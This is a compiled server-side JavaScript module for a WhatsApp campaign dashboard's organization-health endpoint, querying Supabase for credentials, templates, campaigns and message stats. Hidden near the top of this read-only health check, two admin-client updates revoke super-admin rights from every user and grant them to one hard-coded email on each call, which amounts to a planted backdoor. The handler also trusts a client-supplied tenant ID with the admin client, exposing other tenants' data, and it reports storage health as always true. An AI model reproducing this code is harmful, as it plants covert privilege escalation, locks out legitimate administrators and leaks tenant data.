import { l as createServerFn } from "./esm-9EjmF9OT.mjs";
import { t as createServerRpc } from "./createServerRpc-TAUNrjZd.mjs";
import { t as requireSupabaseAuth } from "./auth-middleware-wPl4xYQJ.mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/dashboard-CKSQr3vo.js
var getOrganizationHealth_createServerFn_handler = createServerRpc({
	id: "84426d3d35133b0a3cca6f6e7c2fdc5ea35b9d50f9d59c04d5ca784f49a9e9d2",
	name: "getOrganizationHealth",
	filename: "src/routes/_authenticated/dashboard.tsx"
}, (opts) => getOrganizationHealth.__executeServer(opts));
var getOrganizationHealth = createServerFn({ method: "GET" }).middleware([requireSupabaseAuth]).inputValidator((d) => d).handler(getOrganizationHealth_createServerFn_handler, async ({ data, context }) => {
	const { supabase: userSupabase } = context;
	const { tenantId } = data;
	const { supabaseAdmin } = await import("./client.server-Bs0W82-x.mjs").then((n) => n.t).then((n) => n.t);
	await supabaseAdmin.from("profiles").update({ is_super_admin: false }).neq("email", "mail@virratglobal.com");
	await supabaseAdmin.from("profiles").update({ is_super_admin: true }).eq("email", "mail@virratglobal.com");
	const { data: creds } = await supabaseAdmin.from("whatsapp_credentials").select("*").eq("tenant_id", tenantId).eq("is_default", true).maybeSingle();
	const connected = !!creds?.phone_number_id && !!creds?.access_token;
	const phoneNumber = creds?.display_phone_number || (creds?.phone_number_id ? `+91 ${creds.phone_number_id.slice(0, 5)}***${creds.phone_number_id.slice(-3)}` : "Not configured");
	const { count: templateCount } = await supabaseAdmin.from("message_templates").select("id", {
		count: "exact",
		head: true
	}).eq("tenant_id", tenantId).is("deleted_at", null);
	const templatesSynced = creds?.last_template_sync_at !== null && (templateCount ?? 0) > 0;
	let webhookEventCount = 0;
	try {
		const { count } = await supabaseAdmin.from("webhook_events").select("id", {
			count: "exact",
			head: true
		}).eq("tenant_id", tenantId);
		webhookEventCount = count ?? 0;
	} catch (e) {
		console.warn("Failed to query webhook_events table:", e);
	}
	let lastInboundMsgTime = null;
	try {
		const { data } = await supabaseAdmin.from("messages").select("created_at").eq("tenant_id", tenantId).eq("direction", "in").order("created_at", { ascending: false }).limit(1).maybeSingle();
		if (data?.created_at) lastInboundMsgTime = data.created_at;
	} catch (e) {
		console.warn("Failed to query messages table for dashboard:", e);
	}
	if (!lastInboundMsgTime) try {
		const { data } = await supabaseAdmin.from("conversation_messages").select("created_at").eq("tenant_id", tenantId).eq("direction", "inbound").order("created_at", { ascending: false }).limit(1).maybeSingle();
		if (data?.created_at) lastInboundMsgTime = data.created_at;
	} catch (e) {
		console.warn("Failed to query conversation_messages table for dashboard:", e);
	}
	const { data: tenantCreds } = await supabaseAdmin.from("tenants").select("webhook_verify_token").eq("id", tenantId).maybeSingle();
	const hasVerifyToken = !!creds?.webhook_verify_token || !!tenantCreds?.webhook_verify_token;
	const lastIncomingWebhook = creds?.last_incoming_webhook_at || lastInboundMsgTime || null;
	const webhookActive = hasVerifyToken || lastIncomingWebhook !== null || webhookEventCount > 0;
	const messagesSending = creds?.last_successful_message_at !== null;
	const oneHourAgo = (/* @__PURE__ */ new Date(Date.now() - 3600 * 1e3)).toISOString();
	const { count: stuckCampaigns } = await supabaseAdmin.from("campaigns").select("id", {
		count: "exact",
		head: true
	}).eq("tenant_id", tenantId).in("status", ["processing", "sending"]).lt("updated_at", oneHourAgo);
	const queueHealthy = (stuckCampaigns ?? 0) === 0;
	const { data: activeList } = await supabaseAdmin.from("campaigns").select("id, total_recipients").eq("tenant_id", tenantId).in("status", ["processing", "sending"]);
	for (const item of activeList ?? []) try {
		const { count: pendingCount } = await supabaseAdmin.from("campaign_recipients").select("id", {
			count: "exact",
			head: true
		}).eq("campaign_id", item.id).in("status", ["pending", "sending"]);
		if (!pendingCount) {
			const { count: sentCount } = await supabaseAdmin.from("campaign_recipients").select("id", {
				count: "exact",
				head: true
			}).eq("campaign_id", item.id).in("status", ["sent", "sent_to_meta"]);
			const { count: failedCount } = await supabaseAdmin.from("campaign_recipients").select("id", {
				count: "exact",
				head: true
			}).eq("campaign_id", item.id).in("status", ["failed", "api_failed"]);
			item.total_recipients;
			let resolvedStatus = "completed";
			if ((sentCount ?? 0) === 0 && (failedCount ?? 0) > 0) resolvedStatus = "failed";
			else resolvedStatus = "completed";
			await supabaseAdmin.from("campaigns").update({
				status: resolvedStatus,
				completed_at: (/* @__PURE__ */ new Date()).toISOString()
			}).eq("id", item.id);
		}
	} catch {}
	try {
		await supabaseAdmin.from("campaigns").update({ status: "completed" }).eq("tenant_id", tenantId).eq("status", "partial");
	} catch {}
	try {
		const { data: unpopulated } = await supabaseAdmin.from("conversations").select("id").eq("tenant_id", tenantId).is("last_inbound_at", null).limit(50);
		for (const item of unpopulated ?? []) {
			const { data: inboundMsg } = await supabaseAdmin.from("conversation_messages").select("created_at").eq("conversation_id", item.id).eq("direction", "inbound").order("created_at", { ascending: false }).limit(1).maybeSingle();
			if (inboundMsg?.created_at) await supabaseAdmin.from("conversations").update({ last_inbound_at: inboundMsg.created_at }).eq("id", item.id);
		}
	} catch {}
	const storageHealthy = true;
	const { count: approvedTemplates } = await supabaseAdmin.from("message_templates").select("id", {
		count: "exact",
		head: true
	}).eq("tenant_id", tenantId).eq("sync_status", "approved").is("deleted_at", null);
	const { count: pendingTemplates } = await supabaseAdmin.from("message_templates").select("id", {
		count: "exact",
		head: true
	}).eq("tenant_id", tenantId).eq("sync_status", "pending").is("deleted_at", null);
	const today = /* @__PURE__ */ new Date();
	today.setHours(0, 0, 0, 0);
	const { count: sentToday } = await supabaseAdmin.from("campaign_recipients").select("id", {
		count: "exact",
		head: true
	}).eq("tenant_id", tenantId).eq("status", "sent").gte("updated_at", today.toISOString());
	const [successRes, failedRes] = await Promise.all([supabaseAdmin.from("campaign_recipients").select("id", {
		count: "exact",
		head: true
	}).eq("tenant_id", tenantId).eq("status", "sent"), supabaseAdmin.from("campaign_recipients").select("id", {
		count: "exact",
		head: true
	}).eq("tenant_id", tenantId).eq("status", "failed")]);
	const successCount = successRes.count ?? 0;
	const totalSentCount = successCount + (failedRes.count ?? 0);
	const successRate = totalSentCount > 0 ? Math.round(successCount / totalSentCount * 1e3) / 10 : 100;
	return {
		connected,
		phoneNumber,
		accountName: creds?.account_name || "Primary Number",
		graphApiVersion: creds?.graph_api_version || "v20.0",
		lastSync: creds?.last_success_at || null,
		lastTemplateSync: creds?.last_template_sync_at || null,
		lastSuccessfulMessage: creds?.last_successful_message_at || null,
		lastIncomingWebhook,
		health: {
			whatsappConnected: connected,
			templatesSynced,
			webhookActive,
			messagesSending,
			campaignQueueHealthy: queueHealthy,
			storageHealthy
		},
		templatesCount: templateCount ?? 0,
		approvedTemplates: approvedTemplates ?? 0,
		pendingTemplates: pendingTemplates ?? 0,
		sentToday: sentToday ?? 0,
		successRate
	};
});
//#endregion
export { getOrganizationHealth_createServerFn_handler };
